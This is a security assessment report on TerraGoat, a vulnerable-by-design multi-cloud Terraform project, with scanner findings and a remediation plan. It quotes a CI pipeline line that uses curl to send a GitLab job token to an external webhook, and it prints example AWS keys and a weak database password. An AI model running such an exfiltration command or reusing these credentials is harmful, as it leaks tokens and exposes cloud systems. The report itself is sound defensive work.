# DevSecOps Assessment – Track 2: Multi-Cloud Security Findings

**Target Repository:** TerraGoat (Vulnerable-by-Design Terraform)  
**Clouds in Scope:** AWS · Azure · GCP  
**Scan Date:** 2026-07-07  
**Assessor:** Raju Thirumalai  

---

## Tools Used & Why

| Tool | Purpose | Why This Tool |
|------|----------|--------------|
| **Checkov** | Terraform IaC static analysis | Natively understands HCL, maps to CIS/PCI/SOC2 benchmarks, used by Bridgecrew (who built TerraGoat) |
| **TFSec** | Terraform security scanner with severity ratings | Gives CRITICAL/HIGH/MEDIUM/LOW with CVE-style rule IDs (AVD-*) — better severity signal than Checkov |
| **Trivy** | Multi-purpose misconfiguration + CVE scanner | Scans IaC misconfigs AND container images in one tool; also catches Dockerfile issues |
| **GitLeaks** | Secret/credential scanning in git history + repo | Finds hardcoded secrets that survived code review — including in git history that developers think was "deleted" |

> **Why 4 tools, not 1?** No single tool catches everything. Each tool uses a different rule engine and heuristic. Running all four gives layered coverage — any finding confirmed by 2+ tools is high confidence.

---

## Executive Risk Score

| Cloud | Checkov Fails | TFSec Findings | Trivy Misconfigs | Risk Level |
|-------|:---:|:---:|:---:|:---:|
| AWS | 215 | 119 (9 CRITICAL) | 115 (6 CRITICAL) | 🔴 CRITICAL |
| Azure | 174 | 86 (8 CRITICAL) | 90 (7 CRITICAL) | 🔴 CRITICAL |
| GCP | 56 | 41 (2 CRITICAL) | 49 (2 CRITICAL) | 🟠 HIGH |
| **Total** | **445** | **246** | **254** | 🔴 **CRITICAL** |

**GitLeaks Secrets Found:**
- Git history scan: **5 secrets** (AWS keys, Azure DB passwords)
- Full repo scan: **16 detections** (includes duplicates across scan output files)
- **Unique real secrets: 4** (AWS access key, AWS secret key, Azure SQL password ×2, Azure Postgres password)

---

## Critical Findings – All Clouds (Immediate Action Required)

### CRIT-001 · Hardcoded AWS Access Keys in EC2 User Data
- **File:** `terraform/aws/ec2.tf` line 15–16
- **Tools:** TFSec `AVD-AWS-0029`, Trivy `AWS-0029`, GitLeaks `aws-access-token`
- **Detail:** `AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMAAA` and `AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...` are hardcoded in EC2 `user_data`. User data is accessible via the EC2 metadata service (`http://169.254.169.254/latest/user-data`) by any process on the instance — including malware. It is also visible in the AWS Console to anyone with `ec2:DescribeInstanceAttribute`. Additionally, these keys are now in **git history permanently**.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1552.001 – Credentials in Files

### CRIT-002 · Hardcoded AWS Access Keys in Lambda Environment Variables
- **File:** `terraform/aws/lambda.tf` lines ~44–47
- **Tools:** Checkov `CKV_AWS_45`, GitLeaks `generic-api-key`
- **Detail:** `access_key = "AKIAIOSFODNN7EXAMPLE"` and `secret_key = "wJalrXUtnFEMI/..."` are in Lambda env vars. These are readable by anyone with `lambda:GetFunctionConfiguration` — a very common permission. Lambda env vars also appear in CloudWatch logs if accidentally printed.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1552.001 – Credentials in Files

### CRIT-003 · CI/CD Pipeline Exfiltrates JWT Token to External Webhook
- **File:** `gitlabci/bla.yml` line 7
- **Tools:** Manual review
- **Detail:** `curl --data "$CI_JOB_JWT_V1" https://webhook.site/4cf17d70-...` — The GitLab CI job token is POSTed to an external, attacker-controlled webhook. `CI_JOB_JWT_V1` is an OIDC-compatible short-lived token. If cloud providers are configured to trust GitLab OIDC (AWS `AssumeRoleWithWebIdentity`, GCP Workload Identity), an attacker who receives this token has a window to authenticate as the CI job to cloud resources.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1552.004 – Private Keys / T1567 – Exfiltration Over Web Service

### CRIT-004 · Public S3 Bucket Storing Customer PII
- **File:** `terraform/aws/s3.tf` – `aws_s3_bucket.data`
- **Tools:** Checkov `CKV_AWS_53`, TFSec `AVD-AWS-0107`
- **Detail:** The bucket is explicitly noted as "public" in code comments. It contains `customer-master.xlsx` (uploaded via `aws_s3_bucket_object`). No encryption (no SSE), no versioning, no access logs. World-readable PII data.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1530 – Data from Cloud Storage Object

### CRIT-005 · GCP Cloud Storage Bucket Public to All Internet Users
- **File:** `terraform/gcp/gcs.tf`
- **Tools:** TFSec `AVD-GCP-0027`, Trivy `GCP-0001`
- **Detail:** `google_storage_bucket_iam_binding` grants `roles/storage.objectViewer` to `allUsers` — meaning anyone on the internet, unauthenticated, can read all objects in the bucket.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1530 – Data from Cloud Storage Object

### CRIT-006 · GCP BigQuery Dataset Open to All Authenticated Google Users
- **File:** `terraform/gcp/big_data.tf`
- **Tools:** TFSec `AVD-GCP-0046`, Trivy `GCP-0046`
- **Detail:** `special_group = "allAuthenticatedUsers"` with `role = "READER"`. Anyone with a Google account (free Gmail) can read your entire BigQuery dataset. This includes all tables — potentially containing financial or operational data.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1530 – Data from Cloud Storage Object

### CRIT-007 · Azure NSG Allows RDP (3389) and SSH (22) from Any IP
- **File:** `terraform/azure/networking.tf` – `azurerm_network_security_group.bad_sg`
- **Tools:** TFSec `AVD-AZU-0048`, `AVD-AZU-0047`, Trivy `AZU-0047`
- **Detail:** Two inbound rules: `AllowSSH` (port 22) and `AllowRDP` (port 3389) both with `source_address_prefix = "*"`. RDP exposure is one of the most common ransomware initial access vectors. SSH brute force attacks start within seconds of port 22 being exposed.
- **Severity:** CRITICAL
- **MITRE ATT&CK:** T1190 – Exploit Public-Facing Application / T1021.001 – Remote Desktop Protocol

### CRIT-008 · AWS Security Group SSH Open to 0.0.0.0/0
- **File:** `terraform/aws/ec2.tf` – `aws_security_group.web-node`
- **Tools:** TFSec `AVD-AWS-0107`, Trivy `AWS-0104`
- **Detail:** Inbound port 22 from `0.0.0.0/0`. Combined with CRIT-001 (hardcoded credentials on the same instance), an attacker can directly connect via SSH and then pivot using the embedded AWS keys.
- **Severity:** CRITICAL

### CRIT-009 · RDS Database Publicly Accessible with No Encryption
- **File:** `terraform/aws/db-app.tf`
- **Tools:** Trivy `AWS-0180`, `AWS-0080`, Checkov `CKV_AWS_17`
- **Detail:** `publicly_accessible = true` exposes the MySQL database to the internet. `storage_encrypted = false` means data at rest is plaintext. `backup_retention_period = 0` means no automated backups. `multi_az = false` means single point of failure. `monitoring_interval = 0` means no enhanced monitoring — no visibility into DB performance anomalies.
- **Severity:** CRITICAL

### CRIT-010 · Azure Key Vault Network ACL Allows All Traffic
- **File:** `terraform/azure/key_vault.tf`
- **Tools:** TFSec `AVD-AZU-0013`, Trivy `AZU-0013`
- **Detail:** Key Vault stores encryption keys and secrets but has no network ACL (`network_acls` block missing). Default action is allow-all. A compromised identity in the same tenant can read all secrets.
- **Severity:** CRITICAL

---

## High Findings Summary

### AWS High Findings

| Check ID | Finding | File | Tool |
|----------|---------|------|------|
| AVD-AWS-0131 | Root block device not encrypted | ec2.tf, db-app.tf | TFSec |
| AVD-AWS-0026 | EBS volume not encrypted | ec2.tf | TFSec |
| AVD-AWS-0028 | IMDS v1 enabled (no token required) | ec2.tf, db-app.tf | TFSec |
| AWS-0080 | RDS storage not encrypted | db-app.tf | Trivy |
| CKV_AWS_157 | RDS Multi-AZ disabled | db-app.tf | Checkov |
| CKV_AWS_133 | RDS backup retention = 0 | db-app.tf | Checkov |
| CKV_AWS_17 | RDS publicly accessible | db-app.tf | Checkov |
| CKV_AWS_7 | KMS key rotation disabled | kms.tf | Checkov |
| AVD-AWS-0104 | Security group allows unrestricted egress | ec2.tf | TFSec |
| CKV_AWS_91 | S3 access logging disabled | s3.tf (multiple) | Checkov |
| CKV_AWS_52 | S3 MFA delete not enabled | s3.tf | Checkov |
| CKV_AWS_21 | S3 versioning disabled | s3.tf | Checkov |
| CKV_AWS_18 | S3 access logging disabled | s3.tf | Checkov |
| AWS-0040 | EKS public access enabled | eks.tf | Trivy |
| AVD-AWS-0038 | EKS control plane logging disabled | eks.tf | TFSec |

### Azure High Findings

| Check ID | Finding | File | Tool |
|----------|---------|------|------|
| AVD-AZU-0038 | Managed disk not encrypted | storage.tf | TFSec |
| AVD-AZU-0039 | VM allows password authentication | instance.tf | TFSec |
| AVD-AZU-0006 | App Service TLS version outdated | app_service.tf | TFSec |
| AVD-AZU-0042 | AKS RBAC disabled | aks.tf | TFSec |
| AVD-AZU-0043 | AKS network policy not configured | aks.tf | TFSec |
| CKV_AZURE_8 | AKS Kubernetes Dashboard enabled | aks.tf | Checkov |

### GCP High Findings

| Check ID | Finding | File | Tool |
|----------|---------|------|------|
| AVD-GCP-0043 | GCE instance has IP forwarding | instances.tf | TFSec |
| AVD-GCP-0031 | GCE instance has public IP | instances.tf | TFSec |
| AVD-GCP-0047 | GKE pod security policy not enforced | gke.tf | TFSec |
| AVD-GCP-0048 | GKE legacy metadata endpoints enabled | gke.tf | TFSec |
| AVD-GCP-0053 | GKE control plane exposed to internet | gke.tf | TFSec |
| GCP-0015 | Cloud SQL SSL not enforced | big_data.tf | Trivy |
| GCP-0017 | Cloud SQL publicly exposed | big_data.tf | Trivy |

---

## Secret Scanning Findings (GitLeaks)

| # | Rule | File | Line | Secret (Truncated) |
|---|------|------|------|-------------------|
| 1 | `aws-access-token` | `terraform/aws/ec2.tf` | 15 | `AKIAIOSFODNN7EXAMAAA` |
| 2 | `generic-api-key` | `terraform/aws/ec2.tf` | 16 | `AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...` |
| 3 | `hashicorp-tf-password` | `terraform/azure/sql.tf` | 15, 65, 83 | `administrator_login_password = "Aa12345678"` |
| 4 | `hashicorp-tf-password` | `terraform/azure/postgres.tf` | 11 | `administrator_login_password = "Aa12345678"` |

> ⚠️ **Critical note on git history:** Even if these lines are removed from the current branch, they remain accessible via `git log` and `git show`. The git history must be rewritten using `git filter-repo` or the credentials must be rotated immediately (treat as compromised).

---

## Finding Severity Distribution (TFSec — Best Severity Signal)

```
                CRITICAL   HIGH    MEDIUM   LOW    TOTAL
AWS             9          72      21       17     119
Azure           8          6       53       19     86
GCP             2          12      15       12     41
─────────────────────────────────────────────────────
TOTAL           19         90      89       48     246
```

---

## Remediation Priority Order

1. **[NOW]** Rotate AWS keys `AKIAIOSFODNN7EXAMAAA` and Azure DB password `Aa12345678` — treat as compromised
2. **[NOW]** Remove `$CI_JOB_JWT_V1` exfiltration from GitLab CI pipeline
3. **[Day 1]** Enable S3 Block Public Access at account level
4. **[Day 1]** Remove `allUsers` IAM binding from GCS bucket
5. **[Day 2]** Lock Azure NSG — remove SSH/RDP rules with `*` source
6. **[Day 2]** Set RDS `publicly_accessible = false`, enable encryption
7. **[Week 1]** Enable encryption on all EBS, managed disks, GCS buckets
8. **[Week 1]** Enable logging on all services (CloudTrail, GKE, RDS)
9. **[Week 2]** Fix IAM wildcard policies — apply least privilege
10. **[Month 1]** Architecture redesign: private subnets, VPC endpoints, SSM

---

*See individual tool summaries: [checkov-summary.md](checkov-summary.md) · [tfsec-summary.md](tfsec-summary.md) · [trivy-summary.md](trivy-summary.md) · [gitleaks-summary.md](gitleaks-summary.md)*
